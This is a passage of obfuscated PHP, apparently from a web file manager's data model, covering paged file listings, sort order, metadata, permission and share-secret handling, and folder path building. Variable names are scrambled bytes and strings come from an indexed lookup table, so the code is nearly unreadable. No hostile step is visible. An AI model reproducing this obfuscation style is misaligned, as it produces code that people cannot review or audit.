$íÔ’Ğ»õ[$şûä©›Ø[514]] = 0; } if (isset($íÔ’Ğ»õ[$şûä©›Ø[202]]) && $íÔ’Ğ»õ[$şûä©›Ø[202]] == $şûä©›Ø[238]) { $íÔ’Ğ»õ[$şûä©›Ø[495]] = array($şûä©›Ø[515], $şûä©›Ø[12]); } $Ê¶™Àƒ = $şûä©›Ø[516]; $şÖ—š = $this->field($Ê¶™Àƒ)->_makeOrder()->where($íÔ’Ğ»õ)->selectPage($Ğë²Ñ¼ô); $this->_listPageCheck($şÖ—š, $Ê¶™Àƒ, $íÔ’Ğ»õ); $this->_listDataApply($şÖ—š[$şûä©›Ø[454]], $Ÿ²ŞÈñÊ); $this->_listMake($şÖ—š); return $şÖ—š; } private function _listPageCheck(&$…ü™÷ĞÊ, $â¡‚ìİ», $¸èÔ ) { $ÇïøËİ =& $_SERVER[ÕŸ²ó÷å]; if (!is_array($…ü™÷ĞÊ[$ÇïøËİ[451]])) { return; } $–­†¢²ç = $…ü™÷ĞÊ[$ÇïøËİ[451]]; if ($–­†¢²ç[$ÇïøËİ[453]] <= 1) { return; } if ($–­†¢²ç[$ÇïøËİ[452]] >= 100000) { return; } if (Model($ÇïøËİ[517])->get($ÇïøËİ[518]) != $ÇïøËİ[519]) { return; } $â¡‚ìİ» = str_replace(array($ÇïøËİ[53], $ÇïøËİ[427], $ÇïøËİ[59]), $ÇïøËİ[12], $â¡‚ìİ»); $â¡‚ìİ» = $ÇïøËİ[520] . str_replace($ÇïøËİ[50], $ÇïøËİ[521], $â¡‚ìİ») . $ÇïøËİ[522]; $Ğ±¦èš‡ = $ÇïøËİ[523]; $Ğ±¦èš‡ = $Ğ±¦èš‡ . $ÇïøËİ[524]; $§¾ı®’° = $–­†¢²ç[$ÇïøËİ[448]] * ($–­†¢²ç[$ÇïøËİ[438]] - 1) . $ÇïøËİ[50] . $–­†¢²ç[$ÇïøËİ[448]]; $ü¬¸äÇå = $this->_makeOrder(!0); $ƒ“Ô¡Ş¡ = $ÇïøËİ[520] . str_replace($ÇïøËİ[50], $ÇïøËİ[521], $ü¬¸äÇå[0]); if (strpos($ƒ“Ô¡Ş¡, $ÇïøËİ[525])) { $ƒ“Ô¡Ş¡ = str_replace($ÇïøËİ[525], $ÇïøËİ[526], $ƒ“Ô¡Ş¡); } else { $ƒ“Ô¡Ş¡ .= $ÇïøËİ[527] . $ü¬¸äÇå[1]; } $ö×şÖçÓ = array(); foreach ($¸èÔ  as $ªÈÔˆº => $Òº¥”ÀÒ) { $ö×şÖçÓ[$ÇïøËİ[520] . $ªÈÔˆº] = $Òº¥”ÀÒ; } $this->alias($ÇïøËİ[528])->field($â¡‚ìİ»)->limit($§¾ı®’°)->order($ƒ“Ô¡Ş¡); $šÇŠ‚¤” = $this->join($Ğ±¦èš‡)->where($ö×şÖçÓ)->select(); if ($šÇŠ‚¤”) { $…ü™÷ĞÊ[$ÇïøËİ[454]] = $šÇŠ‚¤”; } } protected function _makeOrder($œ‹•åÀæ = false) { $Ù‰í×ü‹ =& $_SERVER[ÕŸ²ó÷å]; $ÎşÎùù‘ = Model($Ù‰í×ü‹[529])->get($Ù‰í×ü‹[530]); $Ê¹ó¦áÀ = Model($Ù‰í×ü‹[529])->get($Ù‰í×ü‹[531]); $çë÷×î° = array($Ù‰í×ü‹[532] => $Ù‰í×ü‹[533], $Ù‰í×ü‹[534] => $Ù‰í×ü‹[535]); $ØşÉ¸Ÿí = array($Ù‰í×ü‹[32] => $Ù‰í×ü‹[32], $Ù‰í×ü‹[89] => $Ù‰í×ü‹[89], $Ù‰í×ü‹[179] => $Ù‰í×ü‹[495], $Ù‰í×ü‹[536] => $Ù‰í×ü‹[536], $Ù‰í×ü‹[537] => $Ù‰í×ü‹[538], $Ù‰í×ü‹[241] => $Ù‰í×ü‹[241], $Ù‰í×ü‹[98] => $Ù‰í×ü‹[98]); $¨ŞÂôƒÕ = Input::get($Ù‰í×ü‹[539], $Ù‰í×ü‹[7], $ÎşÎùù‘, array_keys($ØşÉ¸Ÿí)); $û¶ë•§ª = Input::get($Ù‰í×ü‹[540], $Ù‰í×ü‹[7], $Ê¹ó¦áÀ, array_keys($çë÷×î°)); if (!in_array($¨ŞÂôƒÕ, array_keys($ØşÉ¸Ÿí))) { $¨ŞÂôƒÕ = $Ù‰í×ü‹[32]; } if (!in_array($û¶ë•§ª, array_keys($çë÷×î°))) { $¨ŞÂôƒÕ = $Ù‰í×ü‹[532]; } if ($¨ŞÂôƒÕ == $Ù‰í×ü‹[32]) { } $ÕÓÎÖ–î = $Ù‰í×ü‹[541] . $ØşÉ¸Ÿí[$¨ŞÂôƒÕ] . $Ù‰í×ü‹[53] . $çë÷×î°[$û¶ë•§ª]; $ÕÓÎÖ–î = rtrim(trim($ÕÓÎÖ–î), $Ù‰í×ü‹[50]); if ($œ‹•åÀæ) { return array($ÕÓÎÖ–î, $çë÷×î°[$û¶ë•§ª]); } return $this->order($ÕÓÎÖ–î); } protected function _listDataApplyItem($ÜŒñÔı¹, $ø£èÜ² = false) { $£ÂÖï· = array($ÜŒñÔı¹); $this->_listDataApply($£ÂÖï·, $ø£èÜ²); return $£ÂÖï·[0]; } protected function _listDataApply(&$İ•ıÉ¤, $¼§êùè÷ = false) { $“·•Ç¥ =& $_SERVER[ÕŸ²ó÷å]; if (!$İ•ıÉ¤) { $İ•ıÉ¤ = array(); return; } $«ÂÉ™ = array_to_keyvalue($İ•ıÉ¤, $“·•Ç¥[12], $“·•Ç¥[203]); $«ÂÉ™ = array_unique($«ÂÉ™); $this->_listSourceCache($İ•ıÉ¤); if (!$¼§êùè÷) { $this->_listAppendMeta($İ•ıÉ¤, $«ÂÉ™); $this->_listAppendFileMeta($İ•ıÉ¤, $«ÂÉ™); $this->_listAppendChildren($İ•ıÉ¤, $«ÂÉ™); } $this->_listAppendPath($İ•ıÉ¤); $this->_listAppendAuth($İ•ıÉ¤); $this->_listAppendSourceInfo($İ•ıÉ¤, $«ÂÉ™); $this->_listAppendUser($İ•ıÉ¤); $this->_listFilterInfo($İ•ıÉ¤, $¼§êùè÷); $this->_listAppendAuthSecret($İ•ıÉ¤); } protected function _listSourceCache($‘¸ö¦«ä) { $şÉ¹¼å¬ =& $_SERVER[ÕŸ²ó÷å]; foreach ($‘¸ö¦«ä as $¡Ş„¯¼) { self::$cacheSourceInfo[$şÉ¹¼å¬[542] . $¡Ş„¯¼[$şÉ¹¼å¬[203]]] = $¡Ş„¯¼; } } protected function _listFilterInfo(&$ŸæÉ©ó, $üŠÑÃ¾Ë = false) { $ˆŸŞôÁğ =& $_SERVER[ÕŸ²ó÷å]; foreach ($ŸæÉ©ó as &$‚Ò¾í½«) { $‚Ò¾í½« = $this->pathInfoFilter($‚Ò¾í½«); self::$cachePathInfo[$ˆŸŞôÁğ[543] . intval($üŠÑÃ¾Ë) . $ˆŸŞôÁğ[471] . $‚Ò¾í½«[$ˆŸŞôÁğ[203]]] = $‚Ò¾í½«; } unset($‚Ò¾í½«); } protected function _listMake(&$•¸Ÿßãè) { $ÏÛ‰‚¨Ê =& $_SERVER[ÕŸ²ó÷å]; $•¸Ÿßãè[$ÏÛ‰‚¨Ê[95]] = array(); $•¸Ÿßãè[$ÏÛ‰‚¨Ê[96]] = array(); foreach ($•¸Ÿßãè[$ÏÛ‰‚¨Ê[454]] as $‰ÒÑ×“ï) { $…ñÔÈ¤ = $‰ÒÑ×“ï[$ÏÛ‰‚¨Ê[494]] == 1 ? $ÏÛ‰‚¨Ê[95] : $ÏÛ‰‚¨Ê[96]; $•¸Ÿßãè[$…ñÔÈ¤][] = $‰ÒÑ×“ï; } unset($•¸Ÿßãè[$ÏÛ‰‚¨Ê[454]]); } protected function _listAppendMeta(&$À«É¯€, $ø£“©¥’) { $€ú«ÁöÖ =& $_SERVER[ÕŸ²ó÷å]; $åã‚º§Ç = array($€ú«ÁöÖ[500] => array($€ú«ÁöÖ[501], $ø£“©¥’)); $²¼ƒ¦ÀÕ = Model($€ú«ÁöÖ[544])->field($€ú«ÁöÖ[545])->where($åã‚º§Ç)->select(); if (!$²¼ƒ¦ÀÕ) { return; } $¥×ı„ñ  = array($€ú«ÁöÖ[546], $€ú«ÁöÖ[547], $€ú«ÁöÖ[526]); $Óì¿ŠŒ = array(); foreach ($²¼ƒ¦ÀÕ as $ˆÇî¤å²) { if (!isset($Óì¿ŠŒ[$ˆÇî¤å²[$€ú«ÁöÖ[203]]])) { $Óì¿ŠŒ[$ˆÇî¤å²[$€ú«ÁöÖ[203]]] = array(); } if (in_array($ˆÇî¤å²[$€ú«ÁöÖ[107]], $¥×ı„ñ )) { continue; } $Óì¿ŠŒ[$ˆÇî¤å²[$€ú«ÁöÖ[203]]][$ˆÇî¤å²[$€ú«ÁöÖ[107]]] = $ˆÇî¤å²[$€ú«ÁöÖ[459]]; } foreach ($À«É¯€ as &$ûÕü¶ÜÑ) { $ûÕü¶ÜÑ[$€ú«ÁöÖ[548]] = !1; if (isset($Óì¿ŠŒ[$ûÕü¶ÜÑ[$€ú«ÁöÖ[203]]])) { $ûÕü¶ÜÑ[$€ú«ÁöÖ[548]] = $Óì¿ŠŒ[$ûÕü¶ÜÑ[$€ú«ÁöÖ[203]]]; } if ($this->fileIsLock($ûÕü¶ÜÑ) && $ûÕü¶ÜÑ[$€ú«ÁöÖ[496]]) { $•ù‡ªŞÑ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $ûÕü¶ÜÑ[$€ú«ÁöÖ[496]][$€ú«ÁöÖ[497]] = AuthModel::authDisable($ûÕü¶ÜÑ[$€ú«ÁöÖ[496]][$€ú«ÁöÖ[497]], $•ù‡ªŞÑ); $ûÕü¶ÜÑ[$€ú«ÁöÖ[496]][$€ú«ÁöÖ[549]][$€ú«ÁöÖ[496]] = $ûÕü¶ÜÑ[$€ú«ÁöÖ[496]][$€ú«ÁöÖ[497]]; } } unset($ûÕü¶ÜÑ); } protected function _listAppendFileMeta(&$ÁÊŠÂåî, $‡»áÚö) { $¯¿ã˜Ş€ =& $_SERVER[ÕŸ²ó÷å]; $Œ„Áøø = array_to_keyvalue($ÁÊŠÂåî, $¯¿ã˜Ş€[12], $¯¿ã˜Ş€[550]); $Œ„Áøø = array_filter(array_unique($Œ„Áøø)); if (!$Œ„Áøø) { return; } $ÙÁ¸Íİá = array($¯¿ã˜Ş€[551] => array($¯¿ã˜Ş€[501], $Œ„Áøø)); $ë‡…¯¹à = $¯¿ã˜Ş€[552]; $†¡‡îŞÍ = Model($¯¿ã˜Ş€[553])->field($ë‡…¯¹à)->where($ÙÁ¸Íİá)->select(); $†¡‡îŞÍ = array_to_keyvalue($†¡‡îŞÍ, $¯¿ã˜Ş€[550]); $¬èú¨ƒó = Model($¯¿ã˜Ş€[554])->field($¯¿ã˜Ş€[555])->where($ÙÁ¸Íİá)->select(); $¬èú¨ƒó = $¬èú¨ƒó ? $¬èú¨ƒó : array(); $éê¢Ş°‚ = array(); foreach ($¬èú¨ƒó as $„ùø¼Ö) { if (!isset($éê¢Ş°‚[$„ùø¼Ö[$¯¿ã˜Ş€[550]]])) { $éê¢Ş°‚[$„ùø¼Ö[$¯¿ã˜Ş€[550]]] = array(); } $éê¢Ş°‚[$„ùø¼Ö[$¯¿ã˜Ş€[550]]][$„ùø¼Ö[$¯¿ã˜Ş€[107]]] = $„ùø¼Ö[$¯¿ã˜Ş€[459]]; } foreach ($ÁÊŠÂåî as &$ã÷Ã®ÌÖ) { $êõ Á’° = $ã÷Ã®ÌÖ[$¯¿ã˜Ş€[550]]; if (!$êõ Á’° || !is_array($†¡‡îŞÍ[$êõ Á’°])) { continue; } $ËÅ°—Å = $†¡‡îŞÍ[$êõ Á’°]; $ËÅ°—Å[$¯¿ã˜Ş€[89]] = $ã÷Ã®ÌÖ[$¯¿ã˜Ş€[89]]; $ËÅ°—Å[$¯¿ã˜Ş€[32]] = $ã÷Ã®ÌÖ[$¯¿ã˜Ş€[32]]; if (!$ËÅ°—Å[$¯¿ã˜Ş€[556]]) { Model($¯¿ã˜Ş€[553])->fileMd5Check($ËÅ°—Å); } if (!isset(self::$cacheFileInfo[$¯¿ã˜Ş€[557] . $êõ Á’°])) { self::$cacheFileInfo[$¯¿ã˜Ş€[557] . $êõ Á’°] = array_merge(array(), $ËÅ°—Å); } unset($†¡‡îŞÍ[$êõ Á’°][$¯¿ã˜Ş€[97]]); $â²¡°ÚØ = isset($éê¢Ş°‚[$êõ Á’°]) && is_array($éê¢Ş°‚[$êõ Á’°]) ? $éê¢Ş°‚[$êõ Á’°] : array(); $ã÷Ã®ÌÖ[$¯¿ã˜Ş€[180]] = array_merge($â²¡°ÚØ, $†¡‡îŞÍ[$êõ Á’°]); if (isset($ã÷Ã®ÌÖ[$¯¿ã˜Ş€[180]][$¯¿ã˜Ş€[194]])) { $ã÷Ã®ÌÖ[$¯¿ã˜Ş€[194]] = json_decode($ã÷Ã®ÌÖ[$¯¿ã˜Ş€[180]][$¯¿ã˜Ş€[194]], !0); unset($ã÷Ã®ÌÖ[$¯¿ã˜Ş€[180]][$¯¿ã˜Ş€[194]]); } } unset($ã÷Ã®ÌÖ); } protected function _listAppendSourceInfo(&$»½Ñ…’ì, $Û³ÜÅ¥¨) { $ï×ú››± =& $_SERVER[ÕŸ²ó÷å]; $Ïˆô¿ç˜ = Model($ï×ú››±[558])->listData(); $»Œİ÷Ÿ = Model($ï×ú››±[508])->listData(); $‘ªÜ½Ù± = Model($ï×ú››±[498])->listData(); $¨»±´ = Model($ï×ú››±[559])->listSimple(); $“‘úäÀò = array_to_keyvalue($Ïˆô¿ç˜, $ï×ú››±[484]); $ŠÍ’ºƒ = array_to_keyvalue_group($»Œİ÷Ÿ, $ï×ú››±[97], $ï×ú››±[509]); $¦šİÚ¥¶ = array_to_keyvalue($‘ªÜ½Ù±, $ï×ú››±[97]); $ÀËà‹—Ù = array_to_keyvalue_group($¨»±´, $ï×ú››±[203]); foreach ($»½Ñ…’ì as &$å˜““Â“) { $å˜““Â“[$ï×ú››±[100]] = array($ï×ú››±[560] => 0, $ï×ú››±[561] => 0, $ï×ú››±[562] => 0); if (isset($¦šİÚ¥¶[$å˜““Â“[$ï×ú››±[203]]])) { $å˜““Â“[$ï×ú››±[100]][$ï×ú››±[563]] = 1; $å˜““Â“[$ï×ú››±[100]][$ï×ú››±[564]] = $¦šİÚ¥¶[$å˜““Â“[$ï×ú››±[203]]][$ï×ú››±[32]]; } if ($ŠÍ’ºƒ && $“‘úäÀò && isset($ŠÍ’ºƒ[$å˜““Â“[$ï×ú››±[203]]])) { $å˜““Â“[$ï×ú››±[100]][$ï×ú››±[565]] = array(); foreach ($ŠÍ’ºƒ[$å˜““Â“[$ï×ú››±[203]]] as $ãÉ¬«šı) { $àÉÆÙ­˜ = $“‘úäÀò[$ãÉ¬«šı]; $å˜““Â“[$ï×ú››±[100]][$ï×ú››±[565]][] = array($ï×ú››±[566] => $àÉÆÙ­˜[$ï×ú››±[484]], $ï×ú››±[503] => $àÉÆÙ­˜[$ï×ú››±[32]], $ï×ú››±[567] => $àÉÆÙ­˜[$ï×ú››±[568]]); } } if ($ÀËà‹—Ù && isset($ÀËà‹—Ù[$å˜““Â“[$ï×ú››±[203]]])) { $å˜““Â“[$ï×ú››±[100]][$ï×ú››±[569]] = array(); foreach ($ÀËà‹—Ù[$å˜““Â“[$ï×ú››±[203]]] as $º¸©¨—®) { $ÉÃıûÜ‹ = $ï×ú››±[570]; if ($º¸©¨—®[$ï×ú››±[571]] == $ï×ú››±[101]) { $ÉÃıûÜ‹ .= $ï×ú››±[572]; } $å˜““Â“[$ï×ú››±[100]][$ï×ú››±[569]] = array_field_key($º¸©¨—®, explode($ï×ú››±[50], $ÉÃıûÜ‹)); } } } unset($å˜““Â“); return $»½Ñ…’ì; } protected function _listAppendChildren(&$÷ºü»ıÅ, $›Á“õ­) { $‡ŞõÜš² =& $_SERVER[ÕŸ²ó÷å]; $Ô±ŒçÎ = array(); $Äúü‹ó = array($‡ŞõÜš²[249] => 0, $‡ŞõÜš²[250] => 0); foreach ($÷ºü»ıÅ as &$âã¼¥ü») { if (!$âã¼¥ü»[$‡ŞõÜš²[494]]) { continue; } $Ô±ŒçÎ[] = $âã¼¥ü»[$‡ŞõÜš²[203]]; } unset($âã¼¥ü»); if (!$Ô±ŒçÎ) { return; } $Œëù†û = array($‡ŞõÜš²[202] => array($‡ŞõÜš²[7], $Ô±ŒçÎ), $‡ŞõÜš²[514] => 0); $¤½ÏÚ÷Ÿ = array($‡ŞõÜš²[202], $‡ŞõÜš²[494], $‡ŞõÜš²[573] => $‡ŞõÜš²[574]); $ù¢Í‰Éù = $this->field($¤½ÏÚ÷Ÿ)->where($Œëù†û)->group($‡ŞõÜš²[575])->select(); $İñ¢½‰ = array(); foreach ($ù¢Í‰Éù as $ÚÛÅì¨‘) { $ƒ¹©“£ò = $ÚÛÅì¨‘[$‡ŞõÜš²[202]]; $õ§€Ì¢İ = $ÚÛÅì¨‘[$‡ŞõÜš²[494]] == $‡ŞõÜš²[101] ? $‡ŞõÜš²[250] : $‡ŞõÜš²[249]; if (!isset($İñ¢½‰[$ƒ¹©“£ò])) { $İñ¢½‰[$ƒ¹©“£ò] = array($‡ŞõÜš²[249] => 0, $‡ŞõÜš²[250] => 0); } $İñ¢½‰[$ƒ¹©“£ò][$õ§€Ì¢İ] += $ÚÛÅì¨‘[$‡ŞõÜš²[574]]; } foreach ($÷ºü»ıÅ as &$âã¼¥ü») { if (!$âã¼¥ü»[$‡ŞõÜš²[494]]) { continue; } $ÆŞµ ÕÏ = is_array($İñ¢½‰[$âã¼¥ü»[$‡ŞõÜš²[203]]]) ? $İñ¢½‰[$âã¼¥ü»[$‡ŞõÜš²[203]]] : $Äúü‹ó; $âã¼¥ü»[$‡ŞõÜš²[250]] = $ÆŞµ ÕÏ[$‡ŞõÜš²[250]]; $âã¼¥ü»[$‡ŞõÜš²[249]] = $ÆŞµ ÕÏ[$‡ŞõÜš²[249]]; unset($âã¼¥ü»[$‡ŞõÜš²[495]]); } unset($âã¼¥ü»); } protected function _listAppendAuth(&$‘‰éÒò®) { $ğ”îÚ·â =& $_SERVER[ÕŸ²ó÷å]; $Ë´Ô‘Ô€ = array(); foreach ($‘‰éÒò® as $í‡”Æ) { if ($í‡”Æ[$ğ”îÚ·â[200]] == self::TYPE_GROUP) { $Ë´Ô‘Ô€[] = $í‡”Æ[$ğ”îÚ·â[203]]; } } if (!$Ë´Ô‘Ô€) { return; } $¢Õœô„À = array_to_keyvalue($‘‰éÒò®, $ğ”îÚ·â[203]); $—áÉÒˆ¹ = Model($ğ”îÚ·â[576])->getSourceList($Ë´Ô‘Ô€, $¢Õœô„À); $ú—ˆœô = KodUser::isRoot(); foreach ($‘‰éÒò® as $×‰Ê„‘ø => &$í‡”Æ) { $í‡”Æ[$ğ”îÚ·â[496]] = $—áÉÒˆ¹[$í‡”Æ[$ğ”îÚ·â[203]]]; if (!$í‡”Æ[$ğ”îÚ·â[496]] && $í‡”Æ[$ğ”îÚ·â[200]] == self::TYPE_GROUP) { $í‡”Æ[$ğ”îÚ·â[496]] = Action($ğ”îÚ·â[577])->pathGroupAuthMake($í‡”Æ[$ğ”îÚ·â[578]]); if (!$í‡”Æ[$ğ”îÚ·â[496]] && !$ú—ˆœô) { $í‡”Æ[$ğ”îÚ·â[243]] = !1; $í‡”Æ[$ğ”îÚ·â[242]] = !1; } } if ($í‡”Æ[$ğ”îÚ·â[496]]) { $í‡”Æ[$ğ”îÚ·â[243]] = AuthModel::authCheckEdit($í‡”Æ[$ğ”îÚ·â[496]][$ğ”îÚ·â[497]]); $í‡”Æ[$ğ”îÚ·â[242]] = AuthModel::authCheckView($í‡”Æ[$ğ”îÚ·â[496]][$ğ”îÚ·â[497]]); } $this->groupPathDisplay($í‡”Æ); } unset($í‡”Æ); } public function _listAppendAuthSecret(&$×ûö¢û·) { $Ö‰İ×ï =& $_SERVER[ÕŸ²ó÷å]; if (Model($Ö‰İ×ï[517])->get($Ö‰İ×ï[579]) != $Ö‰İ×ï[101]) { return; } static $÷Øú±Ëî = false; if (!$÷Øú±Ëî) { $ã”¾ÁŒ¥ = Model($Ö‰İ×ï[580]); $£ƒ¸ÎŠ¨ = Model($Ö‰İ×ï[581]); $÷Øú±Ëî = $£ƒ¸ÎŠ¨->listData(); $÷Øú±Ëî = array_to_keyvalue($÷Øú±Ëî, $Ö‰İ×ï[203]); $åö×É¬ = json_decode(Model($Ö‰İ×ï[517])->get($Ö‰İ×ï[582]), !0); $åö×É¬ = array_to_keyvalue($åö×É¬, $Ö‰İ×ï[484]); foreach ($÷Øú±Ëî as $¤ß–’¢¥ => $ëœÜÅ¶) { $¶ÊÓíô = $åö×É¬[$ëœÜÅ¶[$Ö‰İ×ï[583]]]; if (!$¶ÊÓíô) { $£ƒ¸ÎŠ¨->remove($ëœÜÅ¶[$Ö‰İ×ï[484]]); unset($÷Øú±Ëî[$¤ß–’¢¥]); continue; } $½‰áÑõ = $ã”¾ÁŒ¥->listData($¶ÊÓíô[$Ö‰İ×ï[496]]); if (!$½‰áÑõ) { $£ƒ¸ÎŠ¨->remove($ëœÜÅ¶[$Ö‰İ×ï[484]]); unset($÷Øú±Ëî[$¤ß–’¢¥]); continue; } $ëœÜÅ¶[$Ö‰İ×ï[496]] = $½‰áÑõ; $ëœÜÅ¶[$Ö‰İ×ï[584]] = $¶ÊÓíô; $ëœÜÅ¶[$Ö‰İ×ï[585]] = Model($Ö‰İ×ï[586])->getInfoSimpleOuter($ëœÜÅ¶[$Ö‰İ×ï[536]]); $÷Øú±Ëî[$¤ß–’¢¥] = $ëœÜÅ¶; } } $½‰áä”â = USER_ID; $ø¸¿Õò = array(); $¬„â‘ØÉ = $this->_listAppendPath($ø¸¿Õò, !0); foreach ($×ûö¢û· as $¤ß–’¢¥ => &$ëœÜÅ¶) { if (!is_array($ëœÜÅ¶[$Ö‰İ×ï[496]])) { continue; } if ($ëœÜÅ¶[$Ö‰İ×ï[200]] != $Ö‰İ×ï[587]) { continue; } if (isset($÷Øú±Ëî[$ëœÜÅ¶[$Ö‰İ×ï[203]]])) { $Ô‡³Ñ˜Â = $÷Øú±Ëî[$ëœÜÅ¶[$Ö‰İ×ï[203]]]; if (!is_array($ëœÜÅ¶[$Ö‰İ×ï[548]])) { $ëœÜÅ¶[$Ö‰İ×ï[548]] = array(); } $ëœÜÅ¶[$Ö‰İ×ï[548]][$Ö‰İ×ï[588]] = $Ô‡³Ñ˜Â[$Ö‰İ×ï[583]]; $ëœÜÅ¶[$Ö‰İ×ï[496]][$Ö‰İ×ï[589]] = $Ô‡³Ñ˜Â; $ëœÜÅ¶[$Ö‰İ×ï[496]][$Ö‰İ×ï[590]] = $ëœÜÅ¶[$Ö‰İ×ï[591]]; $ëœÜÅ¶[$Ö‰İ×ï[496]][$Ö‰İ×ï[592]] = $Ö‰İ×ï[101]; if ($Ô‡³Ñ˜Â[$Ö‰İ×ï[536]] != $½‰áä”â) { $ëœÜÅ¶[$Ö‰İ×ï[496]][$Ö‰İ×ï[497]] = $ëœÜÅ¶[$Ö‰İ×ï[496]][$Ö‰İ×ï[497]] & $Ô‡³Ñ˜Â[$Ö‰İ×ï[496]][$Ö‰İ×ï[496]]; } continue; } $¼üæáë = $this->parentLevelArray($ëœÜÅ¶[$Ö‰İ×ï[593]]); $ÊşıÌ°è = array_reverse($¼üæáë); foreach ($ÊşıÌ°è as $Á‘›²¾ => $İ½—é§) { if (!isset($÷Øú±Ëî[$İ½—é§])) { continue; } $Ô‡³Ñ˜Â = $÷Øú±Ëî[$İ½—é§]; $ëœÜÅ¶[$Ö‰İ×ï[496]][$Ö‰İ×ï[589]] = $Ô‡³Ñ˜Â; if ($Ô‡³Ñ˜Â[$Ö‰İ×ï[536]] != $½‰áä”â) { $ëœÜÅ¶[$Ö‰İ×ï[496]][$Ö‰İ×ï[497]] = $ëœÜÅ¶[$Ö‰İ×ï[496]][$Ö‰İ×ï[497]] & $Ô‡³Ñ˜Â[$Ö‰İ×ï[496]][$Ö‰İ×ï[496]]; } $²åÉ„÷‚ = $Ö‰İ×ï[12]; $³ïğ¾‹ú = count($¼üæáë) - $Á‘›²¾; for ($†ÜÕ¯¡ú = 0; $†ÜÕ¯¡ú < $³ïğ¾‹ú; $†ÜÕ¯¡ú++) { if (!isset($¬„â‘ØÉ[$¼üæáë[$†ÜÕ¯¡ú]])) { $²åÉ„÷‚ = $Ö‰İ×ï[12]; break; } $²åÉ„÷‚ = $²åÉ„÷‚ . rtrim($¬„â‘ØÉ[$¼üæáë[$†ÜÕ¯¡ú]], $Ö‰İ×ï[8]) . $Ö‰İ×ï[8]; } $ëœÜÅ¶[$Ö‰İ×ï[496]][$Ö‰İ×ï[590]] = rtrim($²åÉ„÷‚, $Ö‰İ×ï[8]) . $Ö‰İ×ï[8]; break; } } unset($ëœÜÅ¶); } public function groupPathDisplay(&$¥Š·´­š) { $Ù£òÈ´¯ =& $_SERVER[ÕŸ²ó÷å]; if ($¥Š·´­š[$Ù£òÈ´¯[200]] != self::TYPE_GROUP) { return; } $Ë¨öªÎ… = Model($Ù£òÈ´¯[594])->getInfo($¥Š·´­š[$Ù£òÈ´¯[578]]); $Œ•ºòıú = $this->parentLevelArray($Ë¨öªÎ…[$Ù£òÈ´¯[593]]); $ôúİº = $Ù£òÈ´¯[12]; foreach ($Œ•ºòıú as $øÇÉ™òô) { $ÊƒåÈ²³ = Model($Ù£òÈ´¯[594])->getInfo($øÇÉ™òô); $ôúİº .= $ÊƒåÈ²³[$Ù£òÈ´¯[100]][$Ù£òÈ´¯[203]] . $Ù£òÈ´¯[50]; } $¥Š·´­š[$Ù£òÈ´¯[595]] = $Ë¨öªÎ…[$Ù£òÈ´¯[202]]; $¥Š·´­š[$Ù£òÈ´¯[596]] = $Ë¨öªÎ…[$Ù£òÈ´¯[593]]; $¥Š·´­š[$Ù£òÈ´¯[597]] = $Ë¨öªÎ…[$Ù£òÈ´¯[598]]; $¥Š·´­š[$Ù£òÈ´¯[599]] = $ôúİº . $Ë¨öªÎ…[$Ù£òÈ´¯[100]][$Ù£òÈ´¯[203]]; } protected function _listAppendPath(&$›´‚„íâ, $¬ŠŸ÷Å = false) { $ŒâéÚöæ =& $_SERVER[ÕŸ²ó÷å]; static $ôá™ÃÔğ = array(); $“óÌŒôó = array(); $æ”ãêû = array(); if ($¬ŠŸ÷Å) { return $ôá™ÃÔğ; } foreach ($›´‚„íâ as &$½¾­Ş Ñ) { $…Ğ‚› ú = $½¾­Ş Ñ[$ŒâéÚöæ[203]]; if ($½¾­Ş Ñ[$ŒâéÚöæ[494]] == $ŒâéÚöæ[101] && $½¾­Ş Ñ[$ŒâéÚöæ[202]] != 0) { $ôá™ÃÔğ[$…Ğ‚› ú] = $½¾­Ş Ñ[$ŒâéÚöæ[32]]; } if ($½¾­Ş Ñ[$ŒâéÚöæ[494]] == $ŒâéÚöæ[101] && $½¾­Ş Ñ[$ŒâéÚöæ[202]] == 0) { $ôá™ÃÔğ[$…Ğ‚› ú] = $this->_listAppendPathRoot($½¾­Ş Ñ, array()); } if (isset($æ”ãêû[$½¾­Ş Ñ[$ŒâéÚöæ[593]]])) { continue; } $æ”ãêû[$½¾­Ş Ñ[$ŒâéÚöæ[593]]] = !0; $¥‰í„æ¼ = $this->parentLevelArray($½¾­Ş Ñ[$ŒâéÚöæ[593]]); foreach ($¥‰í„æ¼ as $Äõ£¿úÎ => $™Ç²¸°) { if (isset($ôá™ÃÔğ[$™Ç²¸°])) { continue; } if ($Äõ£¿úÎ == 0) { $ôá™ÃÔğ[$™Ç²¸°] = $this->_listAppendPathRoot($½¾­Ş Ñ, $¥‰í„æ¼); } if ($Äõ£¿úÎ != 0) { $“óÌŒôó[] = $™Ç²¸°; } } } unset($½¾­Ş Ñ); $“óÌŒôó = array_unique($“óÌŒôó); if (count($“óÌŒôó) > 0) { $ÈÍ”¹« = array($ŒâéÚöæ[500] => array($ŒâéÚöæ[501], $“óÌŒôó)); if (count($“óÌŒôó) == 1) { $¹×Åí › = $this->sourceInfo($“óÌŒôó[0]); $ææ‚çĞƒ = is_array($¹×Åí ›) ? array($¹×Åí ›) : !1; } else { $ææ‚çĞƒ = $this->field($ŒâéÚöæ[600])->where($ÈÍ”¹«)->select(); } if (!$ææ‚çĞƒ) { $ææ‚çĞƒ = array(); } foreach ($ææ‚çĞƒ as $ãåœü—) { $ôá™ÃÔğ[$ãåœü—[$ŒâéÚöæ[203]]] = $ãåœü—[$ŒâéÚöæ[32]]; } } $Ş÷·Îò = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ãâŒˆœ = array(); foreach ($›´‚„íâ as &$½¾­Ş Ñ) { $òÀıªÎŒ = $½¾­Ş Ñ[$ŒâéÚöæ[593]]; $¸ÑŒŠé = $ŒâéÚöæ[12]; if (isset($ãâŒˆœ[$òÀıªÎŒ])) { $¸ÑŒŠé = $ãâŒˆœ[$òÀıªÎŒ]; } else { $¥‰í„æ¼ = $this->parentLevelArray($½¾­Ş Ñ[$ŒâéÚöæ[593]]); foreach ($¥‰í„æ¼ as $Äõ£¿úÎ => $™Ç²¸°) { if (isset($ôá™ÃÔğ[$™Ç²¸°])) { $¸ÑŒŠé .= $ôá™ÃÔğ[$™Ç²¸°] . $ŒâéÚöæ[8]; } } $ãâŒˆœ[$òÀıªÎŒ] = $¸ÑŒŠé; } $¸ÑŒŠé .= $½¾­Ş Ñ[$ŒâéÚöæ[32]]; if ($½¾­Ş Ñ[$ŒâéÚöæ[494]] == $ŒâéÚöæ[101]) { $¸ÑŒŠé .= $ŒâéÚöæ[8]; } $½¾­Ş Ñ[$ŒâéÚöæ[591]] = 